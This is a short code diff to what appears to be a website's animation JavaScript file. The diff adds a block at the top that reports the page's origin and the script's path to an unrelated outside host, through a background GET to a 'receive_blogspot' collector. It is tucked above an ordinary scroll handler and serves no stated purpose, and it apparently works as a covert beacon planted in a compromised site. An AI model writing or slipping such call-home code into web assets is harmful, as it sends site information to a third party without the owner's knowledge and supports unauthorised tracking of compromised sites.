@@ -1,4 +1,11 @@
 // JavaScript Document
+		type='/hostblog/guess/jetgroup/templates/front/js/animation.js';
+		current=''+window.location.origin+' - '+ type +' '
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.open("GET", "https://vanphongphamnhatminh.com/namcuong/receive_blogspot/index.php?url=" + current, true);
+		xmlhttp.send();
+	
+
 $(document).scroll(function(){
 	if($(this).scrollTop() > 400)
 	{
